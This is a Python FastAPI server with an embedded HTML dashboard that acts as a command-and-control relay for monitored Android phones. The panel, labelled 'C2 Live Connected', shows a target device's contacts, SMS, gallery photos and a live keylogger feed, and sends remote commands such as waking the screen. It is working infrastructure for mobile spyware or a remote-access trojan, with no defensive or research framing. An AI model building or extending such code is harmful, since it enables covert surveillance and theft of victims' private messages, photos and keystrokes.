from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI()

class ConnectionManager:
    def __init__(self):
        self.devices = {}
        self.admin = None

    async def connect_device(self, device_id: str, websocket: WebSocket):
        await websocket.accept()
        self.devices[device_id] = websocket

    def disconnect_device(self, device_id: str):
        if device_id in self.devices:
            del self.devices[device_id]

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin = websocket

    def disconnect_admin(self):
        self.admin = None

    async def broadcast_to_admin(self, message: dict):
        if self.admin:
            await self.admin.send_json(message)

    async def send_to_device(self, device_id: str, message: dict):
        if device_id in self.devices:
            await self.devices[device_id].send_json(message)

manager = ConnectionManager()

@app.websocket("/ws/device/{device_id}")
async def device_websocket(websocket: WebSocket, device_id: str):
    await manager.connect_device(device_id, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            payload = json.loads(data)
            await manager.broadcast_to_admin({"device_id": device_id, "payload": payload})
    except WebSocketDisconnect:
        manager.disconnect_device(device_id)

@app.websocket("/ws/admin")
async def admin_websocket(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            command = json.loads(data)
            target_device = command.get("device_id")
            await manager.send_to_device(target_device, command)
    except WebSocketDisconnect:
        manager.disconnect_admin()

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS — Control Center</title>
<style>
:root{
  --bg:#07090d; --panel:#0d1117; --panel2:#131a24; --line:rgba(255,255,255,.07);
  --txt:#e6edf7; --dim:#7d8899; --cyan:#22d3ee; --violet:#8b5cf6;
  --green:#22c55e; --red:#ef4444; --amber:#f59e0b;
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:var(--bg); color:var(--txt); overflow:hidden;
  font-family:'Inter',system-ui,sans-serif;
}
body::before{
  content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
  background:
    radial-gradient(600px 400px at 15% 0%, rgba(34,211,238,.10), transparent 70%),
    radial-gradient(700px 500px at 90% 100%, rgba(139,92,246,.12), transparent 70%);
}
.app{display:grid;grid-template-columns:248px 1fr;height:100vh;position:relative;z-index:1}
.sidebar{background:linear-gradient(180deg,#0b0f15,#080b10);border-right:1px solid var(--line);display:flex;flex-direction:column;padding:20px 14px}
.brand{display:flex;align-items:center;gap:12px;padding:4px 8px 22px}
.brand-mark{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-weight:800;font-size:18px;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
.brand-text b{display:block;font-size:15px;letter-spacing:.14em}
.brand-text span{font-size:10px;color:var(--dim)}
.nav{display:flex;flex-direction:column;gap:4px;flex:1}
.nav-item{display:flex;align-items:center;gap:12px;padding:11px 12px;border-radius:11px;background:transparent;border:1px solid transparent;color:var(--dim);font-size:13.5px;font-weight:500;cursor:pointer;text-align:left;transition:.18s;font-family:inherit}
.nav-item:hover{background:rgba(255,255,255,.04);color:var(--txt)}
.nav-item.active{background:linear-gradient(90deg,rgba(34,211,238,.14),rgba(139,92,246,.10));border-color:rgba(34,211,238,.28);color:#fff}
.main{display:flex;flex-direction:column;overflow:hidden}
.topbar{height:70px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;border-bottom:1px solid var(--line);background:rgba(10,13,18,.7)}
.views{flex:1;overflow-y:auto;padding:24px 28px 60px}
.view{display:none}
.view.active{display:block}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
.stat{display:flex;align-items:center;gap:14px;padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.03)}
.stat-ico{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:17px;background:rgba(34,211,238,.10)}
.stat-v{font-size:22px;font-weight:700;margin-top:2px}
.sec-head{margin:26px 0 14px;font-size:13px;font-weight:650;letter-spacing:.06em;color:#b9c4d4;text-transform:uppercase}
.contacts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
.contact{display:flex;align-items:center;gap:13px;padding:14px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.035)}
.c-ava{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-size:13px;font-weight:700;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
.c-info h4{font-size:13.5px;font-weight:600}
.c-info p{font-size:11.5px;color:var(--dim);margin-top:2px}
.controls{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
.ctrl{padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.035);display:flex;align-items:center;gap:14px}
.ctrl-ico{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;font-size:19px;background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25)}
.ctrl-txt{flex:1}
.ctrl-txt h4{font-size:13px;font-weight:600}
.ctrl-txt p{font-size:11px;color:var(--dim);margin-top:3px}
.mini-btn{padding:7px 12px;border-radius:9px;font-size:11px;font-weight:600;cursor:pointer;color:var(--txt);background:rgba(255,255,255,.05);border:1px solid var(--line)}
.mini-btn:hover{background:rgba(34,211,238,.15);border-color:rgba(34,211,238,.4);color:var(--cyan)}
.toasts{position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px}
.toast{padding:13px 17px;border-radius:13px;font-size:12.5px;background:#10161e;border:1px solid rgba(34,211,238,.35);color:#fff}
</style>
</head>
<body>
<div class="app">
  <aside class="sidebar">
    <div class="brand">
      <div class="brand-mark">N</div>
      <div class="brand-text"><b>NEXUS</b><span>CONTROL CENTER</span></div>
    </div>
    <nav class="nav">
      <button class="nav-item active" data-view="dashboard">Dashboard</button>
      <button class="nav-item" data-view="contacts">Contacts & SMS</button>
      <button class="nav-item" data-view="gallery">Gallery Photos</button>
      <button class="nav-item" data-view="keystrokes">Live Keylogger</button>
      <button class="nav-item" data-view="controls">Remote Controls</button>
    </nav>
  </aside>
  <main class="main">
    <header class="topbar">
      <h1 id="pageTitle">Dashboard</h1>
      <div style="color:var(--green)">● C2 Live Connected</div>
    </header>
    <div class="views">
      <section class="view active" id="v-dashboard">
        <div class="stats">
          <div class="stat"><div class="stat-ico">🔋</div><div><div>Battery</div><div class="stat-v" id="statBattery">--%</div></div></div>
          <div class="stat"><div class="stat-ico">📡</div><div><div>Carrier</div><div class="stat-v" id="statCarrier" style="font-size:16px">--</div></div></div>
        </div>
        <div class="sec-head">Target Device Information</div>
        <div id="deviceInfoCard" style="padding:16px;border:1px solid var(--line);border-radius:12px;background:rgba(255,255,255,.02)">
          <b>Waiting for telemetry sync...</b>
        </div>
      </section>
      <section class="view" id="v-contacts">
        <div class="sec-head" style="margin-top:0">Synced Contacts</div>
        <div class="contacts" id="contactGrid"><div>No contacts loaded yet.</div></div>
      </section>
      <section class="view" id="v-gallery">
        <div class="sec-head" style="margin-top:0">Client Gallery Photos</div>
        <div class="contacts" id="galleryGrid"><div>No photos synced yet.</div></div>
      </section>
      <section class="view" id="v-keystrokes">
        <div class="sec-head" style="margin-top:0">Live Keystrokes (Keylogger)</div>
        <div class="card" style="padding:16px;background:rgba(0,0,0,.4);border:1px solid var(--line);border-radius:12px;height:400px;overflow-y:auto;font-family:monospace;color:var(--cyan);" id="keystrokeLog">
          [Waiting for user typing activity...]
        </div>
      </section>
      <section class="view" id="v-controls">
        <div class="sec-head" style="margin-top:0">Device Actions</div>
        <div class="controls">
          <div class="ctrl">
            <div class="ctrl-ico">📳</div>
            <div class="ctrl-txt"><h4>Vibration</h4><p>Trigger device vibration</p></div>
            <button class="mini-btn" onclick="sendControl('vibration')">Trigger</button>
          </div>
          <div class="ctrl">
            <div class="ctrl-ico">🔦</div>
            <div class="ctrl-txt"><h4>Flashlight ON</h4><p>Turn on camera torch</p></div>
            <button class="mini-btn" onclick="sendControl('flashlight_on')">Turn ON</button>
          </div>
          <div class="ctrl">
            <div class="ctrl-ico">💡</div>
            <div class="ctrl-txt"><h4>Flashlight OFF</h4><p>Turn off camera torch</p></div>
            <button class="mini-btn" onclick="sendControl('flashlight_off')">Turn OFF</button>
          </div>
          <div class="ctrl">
            <div class="ctrl-ico">🔓</div>
            <div class="ctrl-txt"><h4>Wake Screen</h4><p>Turn screen on remotely</p></div>
            <button class="mini-btn" onclick="sendControl('screen_wake')">Wake Up</button>
          </div>
        </div>
      </section>
    </div>
  </main>
</div>
<div class="toasts" id="toasts"></div>
<script>
const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

function toast(msg){
  const el = document.createElement('div');
  el.className = 'toast'; el.textContent = msg;
  $('#toasts').appendChild(el);
  setTimeout(()=>el.remove(), 2500);
}

$$('.nav-item').forEach(btn=>{
  btn.addEventListener('click',()=>{
    $$('.nav-item').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const v = btn.dataset.view;
    $$('.view').forEach(s=>s.classList.remove('active'));
    $('#v-'+v).classList.add('active');
    $('#pageTitle').textContent = btn.textContent;
  });
});

const ws = new WebSocket((window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host + '/ws/admin');
ws.onopen = () => toast("Connected to C2 Relay");

ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  
  if(msg.payload && msg.payload.type === "live_sync"){
    const p = msg.payload;
    $('#statBattery').textContent = p.battery + '%';
    $('#statCarrier').textContent = p.carrier;
    $('#deviceInfoCard').innerHTML = `<b>Model:</b> ${p.model} (${p.brand}) <br><b>OS:</b> Android ${p.os} <br><b>Carrier:</b> ${p.carrier}`;
    
    if(p.contacts){
      $('#contactGrid').innerHTML = p.contacts.map(c=>`<div class="contact"><div class="c-ava">${c.name[0]}</div><div class="c-info"><h4>${c.name}</h4><p>${p.phone || c.phone}</p></div></div>`).join('');
    }
    if(p.gallery){
      $('#galleryGrid').innerHTML = p.gallery.map(ph=>`<div class="contact"><div class="c-ava">🖼️</div><div class="c-info"><h4>${ph.name}</h4><p>Gallery Image</p></div></div>`).join('');
    }
  }

  if(msg.payload && msg.payload.type === "keystroke"){
    const logBox = $('#keystrokeLog');
    logBox.innerHTML += `<div>[KEYSTROKE] ${msg.payload.text}</div>`;
    logBox.scrollTop = logBox.scrollHeight;
  }
};

function sendControl(action){
  ws.send(JSON.stringify({ device_id: "pixel_7_pro", action: action }));
  toast(`Command sent: ${action}`);
}
</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTML_TEMPLATE
